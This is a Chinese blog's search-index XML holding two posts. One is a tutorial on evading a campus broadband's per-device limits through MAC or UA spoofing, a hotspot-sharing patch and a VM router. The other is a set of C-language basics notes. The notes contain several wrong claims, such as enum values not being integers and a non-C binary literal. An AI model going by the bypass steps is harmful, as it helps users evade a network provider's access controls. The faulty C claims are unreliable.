<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>浅谈校园网宽带破解</title>
    <url>/2022/07/09/%E6%B5%85%E8%B0%88%E6%A0%A1%E5%9B%AD%E7%BD%91%E5%AE%BD%E5%B8%A6%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前在衡的时候，宿舍的校园网还是50M带宽200块钱一个学期，没有任何登录限制，直接分配宽带账号，只需要宿舍内拨号校园网上网即可，那个时候还不知道咱学校的校园网是多给力，直到回来广东了，才领略到被奇葩校园网宽带支配的恐怖。一人一号双设备，0成本白赚钱，说是抢一点都不为过。</p>
<p>这篇文章是自己作为一个不正常的人类的一种分享练习，如果在知识方面有错误的地方，请读者不吝赐教！请指出，本人将不胜感激，如果有新思路，或者有想讨论的点，欢迎来邮<code>elimos@foxmail.com</code></p>
<span id="more"></span>

<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="入网步骤"><a href="#入网步骤" class="headerlink" title="入网步骤"></a>入网步骤</h2><p>先来看一下校园网宽带正常工作的流程，我们这边使用的是某🐏，插入网线后，电脑会跳转到校园网登录页面，此时会要求输入宽带账号密码，这时候倒也不用急着输入，隔壁有个客户端下载，那个才是真正的罪魁祸首。点击下载，安装，会得到以下绿油油的东西</p>
<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc9c43407-2780-4bb0-899b-a44c8201b333%2FUntitled.png?table=block&id=8d207261-81ae-4f5e-9e43-4028c32744b3&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="绿油油的界面"></p>
<p>此时输入办卡的时候短信发给你的账号密码就可以正常冲浪了。</p>
<h2 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h2><p>网上有提到过抓包获取真实宽带拨号的账号密码，但是又有帖子说采用信息摘要算法加密，账号密码前面加了不可见字符，需要用BP重定向，通过这种方式确实是可行，需要一定的操作成本，笔者就没这个心情去抓包了，因为他们使用这种方法拨号最后的结果是不稳定，会断连，而且这个方法也不一定适用于现在的版本，那些帖子都是八百年前发的了。</p>
<h2 id="入网分析"><a href="#入网分析" class="headerlink" title="入网分析"></a>入网分析</h2><p>正常宽带的入网流程是办卡之后，给你一个宽带账号，通过一个猫连上光缆，猫接路由器，路由器通过猫来使用宽带账号进行拨号上网，此时路由器和猫就起到了NAT(网络地址转换)的作用，即将路由器下连接的设备，通过路由器(网关)，将内网(局域网)地址映射为外网地址，接入运营商网络，在网络收敛后达到互联互通的状态。</p>
<p>当前校园网宽带的限设备就作用在拨号上网与NAT中间，将真实的拨号账号隐藏起来，给你一个只能用于那个绿油油的窗口的”宽带账号“，这就相当于一个买菜中介，正常情况下买菜可以你直接去菜市场买菜，一次带3根胡萝卜回来。这个买菜中介非要插个手，还把菜市场的路藏起来：”你不付钱人都别想出去，付了钱买了买菜资格之后，你出去买菜可以，先让我验一下带了几根胡萝卜，一个人最多带两根胡萝卜。“</p>
<h1 id="学习思路"><a href="#学习思路" class="headerlink" title="学习思路"></a>学习思路</h1><p>既然我们已经知道了他在哪个层面上从中作梗，那么我们就可以有针对性性地绕开这种限制，笔者有几种思路</p>
<p>一种就是<strong>伪造MAC</strong>地址，MAC其实就是设备的身份证，伪造MAC地址可以让接入宽带的路由器在识别的时候认为都是同一个设备。</p>
<blockquote>
<p>相当于出去买菜的时候大家都用同一个身份证，这个中介只看身份证来判断是不是同一个人</p>
</blockquote>
<p>但是在查阅了一些帖子后发现，运营商好像更新了UA检测，UA就是UserAgent,服务器通过识别 “UA”来确定用户所使用的操作系统版本、CPU 类型、浏览器版本等信息，他是包含在http协议报文的头部中的信息段，现代上网体系都是TCP/IP体系，只要是连接互联网，一般都是通过http协议进行三次握手来建立连接，也就是说，UA检测是绕不开的，但是也可以伪装，不过这就对接入设备有要求了，每一个连接都要进行修改UA，可以通过编写脚本来解决，但是自己造轮子就显然不是打工人想干的活了，如果有读者提供能用的具体实现，欢迎联系我更新文章，造福后代。</p>
<blockquote>
<p>UA检测就相当于中介不只看你的身份证了，还看你的脸</p>
</blockquote>
<p>还可以<strong>构建子网</strong>，简单粗暴，缺点就是网速受限</p>
<blockquote>
<p>相当于你帮一百个人带胡萝卜，虽然你一次只能带两根，但是带得勤啊，帮别人也带带。</p>
</blockquote>
<p>通过开放端口连接外网服务器进行<strong>反向代理</strong></p>
<blockquote>
<p>相当于你从围墙里找别人帮你带胡萝卜，这样直接不需要购买宽带卡也能上网，但是需要有一个外网的服务器，也就是找到帮你带胡萝卜的人</p>
</blockquote>
<h1 id="构建子网的学习方法"><a href="#构建子网的学习方法" class="headerlink" title="构建子网的学习方法"></a>构建子网的学习方法</h1><p>最简单的构建子网的方法就是开热点，但是直接开是行不通的，还记得那个绿油油的东西嘛，你直接开热点虽然可以连接，但是连接设备多了之后就会检测到设备数量异常，因此我们需要一点手段</p>
<h2 id="方法1-破解热点分享限制"><a href="#方法1-破解热点分享限制" class="headerlink" title="方法1: 破解热点分享限制"></a>方法1: 破解热点分享限制</h2><p>推荐使用这种方法，操作简单</p>
<p><a href="https://github.com/PandaAdap/EShareTool/releases">Releases · PandaAdap/EShareTool</a></p>
<ul>
<li>下载以上补丁，解压在合适位置</li>
<li>连接宽带</li>
<li>在<code>设置-网络-移动热点</code>中开启热点（最好先按编辑设置一下热点名和密码）</li>
<li>打开补丁，一路确定即可</li>
<li>所有设备使用这一个wifi进行上网，注意别用的太狠哟，别人会没网的</li>
</ul>
<h3 id="Q-amp-A-1-：打开不了热点？"><a href="#Q-amp-A-1-：打开不了热点？" class="headerlink" title="Q&amp;A 1 ：打开不了热点？"></a>Q&amp;A 1 ：打开不了热点？</h3><blockquote>
<p>需要无线网卡，没有无线网卡没法打开移动热点</p>
</blockquote>
<h3 id="Q-amp-A-2：热点使用的是5Ghz频段，有些设备搜索不到wifi"><a href="#Q-amp-A-2：热点使用的是5Ghz频段，有些设备搜索不到wifi" class="headerlink" title="Q&amp;A 2：热点使用的是5Ghz频段，有些设备搜索不到wifi?"></a>Q&amp;A 2：热点使用的是5Ghz频段，有些设备搜索不到wifi?</h3><ul>
<li>在设置中搜索<code>查看网络连接</code></li>
<li>选中你的无线网卡(一般带Wireless字样)，右键打开属性</li>
</ul>
<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F3c4eface-ef8e-41aa-9d35-ad94f1417e5e%2FUntitled.png?table=block&id=3977ea28-5d68-4abc-9735-1d472f5acdae&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="网络适配器选项"></p>
<ul>
<li>选中Mircosoft网络客户端(默认选中) , 点配置</li>
</ul>
<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F6068213c-24eb-4321-a983-8a543bf76e8d%2FUntitled.png?table=block&id=74ae7552-de9b-485c-ab68-3ffd82aa11fb&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="适配器设置"></p>
<ul>
<li>顶上标签选中高级 找到地下波段优先级(Preferred Band) ,选中2.4G优先即可</li>
</ul>
<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ff4bdd9dd-cf4c-4978-967b-c01a1edd4549%2FUntitled.png?table=block&id=13988e2f-7969-4bcd-ad0d-89e844992da1&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="修改优先级"></p>
<ul>
<li>保存，确定 ，退出，重启电脑 , 重新开启热点即可</li>
</ul>
<h2 id="方法2：虚拟机"><a href="#方法2：虚拟机" class="headerlink" title="方法2：虚拟机"></a>方法2：虚拟机</h2><blockquote>
<p>最好还是一个外置无线网卡，不然可能会被检测到</p>
</blockquote>
<h3 id="安装虚拟机-vmware-virtualbox啥的都行"><a href="#安装虚拟机-vmware-virtualbox啥的都行" class="headerlink" title="安装虚拟机 vmware/virtualbox啥的都行"></a>安装虚拟机 vmware/virtualbox啥的都行</h3><h3 id="安装win10-OpenWRT"><a href="#安装win10-OpenWRT" class="headerlink" title="安装win10/OpenWRT"></a>安装win10/OpenWRT</h3><blockquote>
<p>其他系统也可以，但是需要注意网卡驱动问题</p>
</blockquote>
<h3 id="在虚拟机中安装WIFI管家-在虚拟机中开启热点"><a href="#在虚拟机中安装WIFI管家-在虚拟机中开启热点" class="headerlink" title="在虚拟机中安装WIFI管家/在虚拟机中开启热点"></a>在虚拟机中安装WIFI管家/在虚拟机中开启热点</h3><blockquote>
<p>各类wifi管家可以对热点进行限速，就是流氓了点<br>直接开启热点没法对设备进行限速，可能会各自卡各自的网速</p>
</blockquote>
<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>本杂谈仅供学习交流使用</p>
]]></content>
      <categories>
        <category>Tutorial</category>
      </categories>
      <tags>
        <tag>Learning</tag>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言基础——从入门到入墙</title>
    <url>/2022/07/05/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E2%80%94%E2%80%94%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%A2%99/</url>
    <content><![CDATA[<h1 id="C语言"><a href="#C语言" class="headerlink" title="C语言"></a>C语言</h1><p>C语言作为一切学习的起点，要多回来复习复习哟</p>
<span id="more"></span>

<h1 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a>计算机基础</h1><h2 id="计算机存储单位-从小到大"><a href="#计算机存储单位-从小到大" class="headerlink" title="计算机存储单位(从小到大)"></a>计算机存储单位(从小到大)</h2><p>1bit（比特位）= 1位二进制(0或1)</p>
<p>1B（Byte字节）=8bit</p>
<p>1KB (Kilobyte 千字节)=1024B，</p>
<p>1MB (Mega byte 兆字节 简称“兆”)=1024KB，</p>
<p>1GB（Giga byte 吉字节 又称“千兆”)=1024MB，</p>
<p>1TB（Tera byte 万亿字节 太字节)=1024GB，其中1024=2^10 ( 2 的10次方)，</p>
<h2 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a>字节序</h2><p>计算机中存储数据的方式</p>
<ul>
<li><strong>大端序</strong></li>
</ul>
<blockquote>
<p>数据的高字节存放到低地址，低字节存放到高地址</p>
</blockquote>
<ul>
<li><strong>小端序</strong></li>
</ul>
<blockquote>
<p>数据的高字节存放到高地址，低字节存放到低地址</p>
</blockquote>
<h2 id="内存区域划分"><a href="#内存区域划分" class="headerlink" title="内存区域划分"></a>内存区域划分</h2><ul>
<li>堆空间</li>
</ul>
<blockquote>
<p>只有使用malloc,calloc,realloc这三个函数申请的空间才是堆空间，容量很大，使用完后需要使用free主动释放</p>
</blockquote>
<ul>
<li>栈空间</li>
</ul>
<blockquote>
<p>局部变量，函数调用都是要使用栈空间，先进后出，栈空间容量大概只有8M</p>
</blockquote>
<ul>
<li><p>数据段</p>
<ul>
<li>.bss 未初始化的静态变量(全局变量和static修饰的变量)</li>
<li>.data  初始化的静态变量(全局变量和static修饰的变量)</li>
<li>.rodata 常量 const修饰的常量</li>
</ul>
</li>
<li><p>代码段</p>
<ul>
<li>.text 程序员写的代码段</li>
<li>.init 汇编启动代码</li>
</ul>
</li>
</ul>
<h2 id="进制之间的转换，进制加减法"><a href="#进制之间的转换，进制加减法" class="headerlink" title="进制之间的转换，进制加减法"></a>进制之间的转换，进制加减法</h2><ul>
<li>短除法</li>
</ul>
<hr>
<h1 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>辅助别人看懂你的代码</p>
<h2 id="两种注释类型"><a href="#两种注释类型" class="headerlink" title="两种注释类型"></a>两种注释类型</h2><h3 id="单行注释"><a href="#单行注释" class="headerlink" title="单行注释"></a>单行注释</h3><ul>
<li>一次只可以注释掉一行代码，注释的代码是不参与编译的</li>
<li>用//表示单行注释</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这是一个行注释</span></span><br></pre></td></tr></table></figure>

<h3 id="块注释"><a href="#块注释" class="headerlink" title="块注释"></a>块注释</h3><ul>
<li>一次注释掉多行</li>
<li>用<code>/*CONTENT*/</code>表示块注释</li>
<li>块注释不可以嵌套块注释使用</li>
<li>块注释里面可以嵌套使用行注释</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这是一个块注释</span></span><br><span class="line"><span class="comment">// 这是一个块注释中嵌套的行注释</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">*/</span> <span class="comment">//这样使得后面的那一个*/失效</span></span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><ul>
<li>用来存储数据</li>
<li>变量实际上就是一块可以用来存储可变(类型可变，内容可变)的值的一块内存区域</li>
</ul>
<h2 id="定义-definition-和声明-declaration-变量"><a href="#定义-definition-和声明-declaration-变量" class="headerlink" title="定义(definition)和声明(declaration)变量"></a>定义(definition)和声明(declaration)变量</h2><h3 id="定义声明"><a href="#定义声明" class="headerlink" title="定义声明"></a>定义声明</h3><p><strong><code>[变量类型] &#123;变量名&#125;</code></strong></p>
<p>会分配内存的声明，有几种写法</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义声明演示</span></span><br><span class="line"><span class="type">short</span> a;    <span class="comment">//定义一个short类型的变量,变量名为a,但是该变量没有初始化赋值</span></span><br><span class="line"></span><br><span class="line"><span class="type">short</span> a=<span class="number">89</span>; <span class="comment">//定义变量a，立马初始化为89</span></span><br><span class="line"></span><br><span class="line"><span class="type">short</span> a;    <span class="comment">//定义变量a</span></span><br><span class="line">a=<span class="number">78</span>;       <span class="comment">//在使用之前初始化为78</span></span><br><span class="line"></span><br><span class="line"><span class="type">short</span> a,b,c,d;  <span class="comment">//同时定义了四个变量,都是short类型,都没有初始化赋值</span></span><br><span class="line"></span><br><span class="line"><span class="type">short</span> a,b=<span class="number">89</span>,c,d=<span class="number">56</span>; <span class="comment">// 同时定义了四个short类型变量，部分变量初始化</span></span><br></pre></td></tr></table></figure>

<h3 id="普通声明"><a href="#普通声明" class="headerlink" title="普通声明"></a>普通声明</h3><p><strong><code>extern [变量类型] &#123;变量名&#125;</code></strong></p>
<p>仅声明，不会分配内存 如<code>extern int a[];</code></p>
<h3 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a>命名规范</h3><ul>
<li><strong>变量名只能由字母，数字和下划线组成，不能包含其它特殊符号</strong></li>
<li><strong>变量名不可以跟C语言的关键字同名</strong></li>
<li><strong>首字符不可以是数字</strong></li>
<li>变量取名字通俗易懂，不要用拼音，用英文单词(行业潜规则)</li>
<li>大驼峰法：类名，函数名(通用)，属性名，命名空间</li>
<li>小驼峰：变量，函数名(Java系)</li>
</ul>
<hr>
<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h2><table>
<thead>
<tr>
<th>关键字</th>
<th>类型名</th>
<th>占用字节(Byte)</th>
</tr>
</thead>
<tbody><tr>
<td>short</td>
<td>短整型</td>
<td>2</td>
</tr>
<tr>
<td>int</td>
<td>整型</td>
<td>4</td>
</tr>
<tr>
<td>long</td>
<td>长整型</td>
<td>8(x64) / 4(x32)</td>
</tr>
<tr>
<td>long long</td>
<td>长长整型</td>
<td>8</td>
</tr>
<tr>
<td>unsigned short</td>
<td>无符号的短整型</td>
<td>2</td>
</tr>
<tr>
<td>unsigned int</td>
<td>无符号的整型</td>
<td>4</td>
</tr>
<tr>
<td>unsigned long</td>
<td>无符号的长整型</td>
<td>8(x64) / 4(x32)</td>
</tr>
<tr>
<td>unsigned long long</td>
<td>无符号的长长整型</td>
<td>8</td>
</tr>
</tbody></table>
<h2 id="整数在计算机中的存储方式"><a href="#整数在计算机中的存储方式" class="headerlink" title="整数在计算机中的存储方式"></a>整数在计算机中的存储方式</h2><p>最高位是符号位，用0表示正数，用1表示负数</p>
<ul>
<li>正数：在计算机中采用原码存储的</li>
<li>负数：在计算机中采用补码存储的</li>
<li>原码：指的是一个数原本的二进制</li>
<li>反码：原码全部取反</li>
<li>补码：反码加1得到补码</li>
</ul>
<h2 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h2><p>char类型表示字符，单引号表示单个字符</p>
<blockquote>
<p>char可以用ASCII码以整数的形式进行输出，这是因为键盘上的每一个字符都在ascii表中</p>
</blockquote>
<p>常用的ASCII码：</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>ASCII码值</th>
</tr>
</thead>
<tbody><tr>
<td>A</td>
<td>65</td>
</tr>
<tr>
<td>a</td>
<td>97</td>
</tr>
<tr>
<td>‘0’</td>
<td>48</td>
</tr>
</tbody></table>
<p>查看ASCII码表:<code>man ascii</code></p>
<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F736fcfd5-972a-4d01-a871-7405c931f90a%2FUntitled.png?table=block&id=b18e6a4b-f4e0-4023-bb35-1dabeaa07422&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="ascii1"></p>
<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fce200f2b-055f-417b-b838-52e7b18e925b%2FUntitled.png?table=block&id=091e3d66-4222-4ebd-a78d-065b0e12d860&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="ascii2"></p>
<p><strong>char字符越界</strong></p>
<p>char类型数据本身占8位二进制，数据超出范围以后，计算机会把高位的去掉，保留低位</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 字符数据越界演示</span></span><br><span class="line"><span class="type">char</span> a=<span class="number">300</span>;      <span class="comment">// 字符数据越界</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a);  <span class="comment">// 结果:44</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> a=<span class="number">417</span>;      <span class="comment">// 字符数据越界</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a);  <span class="comment">// 结果:-95</span></span><br></pre></td></tr></table></figure>

<h2 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h2><p>当计算机接收到一个浮点数常量时，计算机默认其数据类型为double</p>
<table>
<thead>
<tr>
<th>关键字</th>
<th>类型名</th>
<th>占用字节(Bte)</th>
</tr>
</thead>
<tbody><tr>
<td>float</td>
<td>单精度浮点型</td>
<td>4</td>
</tr>
<tr>
<td>double</td>
<td>双精度浮点型</td>
<td>8</td>
</tr>
</tbody></table>
<h3 id="浮点数在计算机中的存储方式"><a href="#浮点数在计算机中的存储方式" class="headerlink" title="浮点数在计算机中的存储方式"></a>浮点数在计算机中的存储方式</h3><ol>
<li>先求出整数部分的二进制(除2取余)</li>
<li>再来求出小数部分的二进制(乘2取整)</li>
<li>规格化存储</li>
</ol>
<blockquote>
<p>有些小数是无法精准表示：如12.56<br>有些小数是可以精准表示：如12.5</p>
</blockquote>
<h2 id="指针类型"><a href="#指针类型" class="headerlink" title="指针类型"></a>指针类型</h2><blockquote>
<p>在不同的处理器中指针长度不一，但在相同处理器中所有类型的指针长度都是一致的</p>
</blockquote>
<p>指针就是一个固定长度的地址变量，存放的数据类型是十六进制地址</p>
<h2 id="BOOL类型"><a href="#BOOL类型" class="headerlink" title="BOOL类型"></a>BOOL类型</h2><blockquote>
<p>在C99 中引入了_Bool类型 如果要使用bool的<code>true</code>与<code>false</code>, 则需要<code>#include &lt;stdbool.h&gt;</code></p>
</blockquote>
<ul>
<li>只要不是0，全部都是真(TRUE)的</li>
<li>只要是0，就是假(FALSE)的</li>
</ul>
<h2 id="枚举类型"><a href="#枚举类型" class="headerlink" title="枚举类型"></a>枚举类型</h2><p>枚举的本质就是整型常量</p>
<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><code>**enum 枚举名&#123;枚举值&#125;;**</code></p>
<ul>
<li>没有赋值符</li>
<li>枚举值不指定时，默认从0开始</li>
<li>枚举值不可以是整型</li>
</ul>
<h2 id="复合数据类型"><a href="#复合数据类型" class="headerlink" title="复合数据类型"></a>复合数据类型</h2><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p>结构体中包含多种数据类型，可以处理复杂数据结构情况</p>
<h3 id="共用体"><a href="#共用体" class="headerlink" title="共用体"></a>共用体</h3><p>共用体中所有元素公用一块内存区域，共用体大小取决于其中最大的元素的大小，一般应用于互斥变量</p>
<h2 id="数据表示方式"><a href="#数据表示方式" class="headerlink" title="数据表示方式"></a>数据表示方式</h2><h3 id="格式控制符"><a href="#格式控制符" class="headerlink" title="格式控制符"></a>格式控制符</h3><table>
<thead>
<tr>
<th>格式控制符</th>
<th>释义</th>
</tr>
</thead>
<tbody><tr>
<td>%d</td>
<td>打印有符号整数的十进制</td>
</tr>
<tr>
<td>%i</td>
<td>输出:打印整数十进制      输入:接收八、十六进制</td>
</tr>
<tr>
<td>%ld</td>
<td>打印长整型</td>
</tr>
<tr>
<td>%lld</td>
<td>打印长整型</td>
</tr>
<tr>
<td>%hd</td>
<td>打印短整型</td>
</tr>
<tr>
<td>%c</td>
<td>打印字符的字面值</td>
</tr>
<tr>
<td>%u</td>
<td>把整数当成无符号数来计算然后打印</td>
</tr>
<tr>
<td>%lu</td>
<td>打印无符号长整型</td>
</tr>
<tr>
<td>%x</td>
<td>打印整数的十六进制</td>
</tr>
<tr>
<td>%#X</td>
<td>打印带0x的大写十六进制</td>
</tr>
<tr>
<td>%o</td>
<td>打印八进制</td>
</tr>
<tr>
<td>%#o</td>
<td>打印带0的八进制</td>
</tr>
<tr>
<td>%s</td>
<td>打印字符串</td>
</tr>
<tr>
<td>%p</td>
<td>打印地址值(首地址)，打印指针</td>
</tr>
<tr>
<td>%f</td>
<td>打印float (%.3f 保留小数点后3位)</td>
</tr>
<tr>
<td>%lf</td>
<td>打印double</td>
</tr>
</tbody></table>
<h3 id="位宽"><a href="#位宽" class="headerlink" title="位宽"></a>位宽</h3><p>打印输出变量值的时候，可以设置打印的位宽(打印出来的变量占用的位置宽度)</p>
<ul>
<li>正数位宽：在数据的左边补充空格，凑够你需要的位宽</li>
<li>负数位宽：在数据的右边补充空格，凑够你需要的位宽</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 位宽演示</span></span><br><span class="line"><span class="type">int</span> num = <span class="number">404</span>;  </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%-10d%d&quot;</span>,num,num); <span class="comment">//404       404 </span></span><br><span class="line"><span class="comment">// 中间间隔7个空格</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%2d&quot;</span>,num); <span class="comment">//404</span></span><br><span class="line"><span class="comment">// 设置2个位宽，位宽设置小了不起任何作用</span></span><br></pre></td></tr></table></figure>

<h3 id="小数位数"><a href="#小数位数" class="headerlink" title="小数位数"></a>小数位数</h3><ul>
<li>%f，%lf打印小数，默认是保留小数点后面6个有效数字</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 小数位数演示</span></span><br><span class="line">%<span class="number">-15.9f</span>   <span class="number">15</span>表示<span class="number">15</span>个位宽，<span class="number">9</span>表示小数点后面保留<span class="number">9</span>个数字</span><br></pre></td></tr></table></figure>

<h3 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h3><p>用<code>\</code>把一些特殊的字符转变含义</p>
<ul>
<li>\181  \7A  把8进制或16进制数转换成10进制</li>
<li>\x 把十六进制数转为十进制</li>
</ul>
<h3 id="进制表示-UnDone"><a href="#进制表示-UnDone" class="headerlink" title="进制表示[!UnDone]"></a>进制表示[!UnDone]</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 进制表示</span></span><br><span class="line"><span class="type">int</span> b = <span class="number">4&#x27;b</span>0111;  <span class="comment">//二进制</span></span><br><span class="line"><span class="type">int</span> n = <span class="number">123</span>;     <span class="comment">//十进制</span></span><br><span class="line"><span class="type">int</span> m = <span class="number">0123</span>;    <span class="comment">//八进制</span></span><br><span class="line"><span class="type">int</span> k = <span class="number">0x123</span>;   <span class="comment">//十六进制</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="格式化输入输出"><a href="#格式化输入输出" class="headerlink" title="格式化输入输出"></a>格式化输入输出</h1><h2 id="输入SCANF"><a href="#输入SCANF" class="headerlink" title="输入SCANF"></a>输入SCANF</h2><p><strong><code>scanf(&quot;格式控制符&quot;,变量的地址);</code></strong></p>
<p>scanf只会严格按照格式控制符进行读取，从键盘上读取到的输入会进入到缓冲区中，然后根据格式化控制符从IO缓冲区中读取合适的字符串后转换成对应的数据类型</p>
<p><code>int getchar(void)</code></p>
<ul>
<li>从缓冲区中一次读取一个字符</li>
<li>返回从缓冲区中读取到的字符的ASCII码值</li>
</ul>
<h2 id="输出PRINTF"><a href="#输出PRINTF" class="headerlink" title="输出PRINTF"></a>输出PRINTF</h2><p><strong><code>printf(&quot;格式控制符&quot;,变量的名字);</code></strong></p>
<p>printf会把存放在IO缓冲区中的内容在屏幕上显示出来</p>
<h2 id="IO缓冲区"><a href="#IO缓冲区" class="headerlink" title="IO缓冲区"></a>IO缓冲区</h2><p>有三种情况会自动刷新缓冲区（即输出缓冲区内容）</p>
<ol>
<li>return/exit/程序结束</li>
<li>缓冲区满</li>
<li>\n</li>
</ol>
<h3 id="清空标准IO缓冲区"><a href="#清空标准IO缓冲区" class="headerlink" title="清空标准IO缓冲区"></a>清空标准IO缓冲区</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(getchar() !=<span class="string">&#x27;\n&#x27;</span>);</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p><code>+</code>  算术加</p>
<p><code>-</code>  算术减</p>
<p><code>*</code>  算术乘</p>
<p><code>/</code>  算术除</p>
<p><code>%</code>  算术余(只能对整数求余)</p>
<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p><code>||</code> 逻辑或</p>
<blockquote>
<p>可以理解为算术加 只要有1个1即为1</p>
</blockquote>
<ul>
<li>运算规则:从左到右依次判断每个表达式的值是否为真，如果有一个表达式为真，后面的表达式不参与计算，整个表达式全部为真</li>
</ul>
<p><code>&amp;&amp;</code> 逻辑与</p>
<blockquote>
<p>可以理解位算术乘 只要有1个0即为0</p>
</blockquote>
<ul>
<li>运算规则:从左到右依次判断每个表达式的值是否为真，如果有一个表达式为假，后面的表达式不参与计算，整个表达式全部为假</li>
</ul>
<p><code>!</code>  逻辑反</p>
<blockquote>
<p>取反 有1变0 有0变1</p>
</blockquote>
<h3 id="逻辑运算符混合运算"><a href="#逻辑运算符混合运算" class="headerlink" title="逻辑运算符混合运算"></a>逻辑运算符混合运算</h3><blockquote>
<p>由于&amp;&amp;优先级高，所以先用括号把&amp;&amp;括起来作为一个整体，其它部分(其它部门都是逻辑或)按照从左到右</p>
</blockquote>
<ul>
<li>条件1||条件2&amp;&amp;条件3||条件4</li>
</ul>
<p>例如：if((a&gt;b)||(a=a+10)&amp;&amp;(b=b-a)||(a-b&lt;3))<br>整体看成逻辑或，从左到右计算，中间的条件2和条件3看成整体</p>
<ul>
<li>条件1&amp;&amp;条件2||条件3||条件4</li>
</ul>
<p>例如：if((a&gt;b)&amp;&amp;(a=a+10)||(b=b-a)||(a-b&lt;3))<br>整体看成逻辑或，从左到右计算，前面的条件1和条件2看成整体</p>
<ul>
<li>条件1||条件2||条件3&amp;&amp;条件4</li>
</ul>
<p>if((a&gt;b)||(a=a+10)||(b=b-a)&amp;&amp;(a-b&lt;3))</p>
<h2 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h2><p><code>&gt;</code>   关系大于</p>
<p><code>&lt;</code>   关系小于</p>
<p><code>==</code>  关系等于</p>
<p><code>!=</code>  关系不等</p>
<p><code>&gt;=</code>  关系大于等于</p>
<p><code>&lt;=</code>  关系小于等于</p>
<h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><p><code>=</code> 赋值运算符</p>
<h3 id="左值"><a href="#左值" class="headerlink" title="左值"></a>左值</h3><p>赋值运算左边的那个式子，就叫做左值</p>
<ul>
<li>左值只能是变量名，不可以是表达式，不可以是常量</li>
</ul>
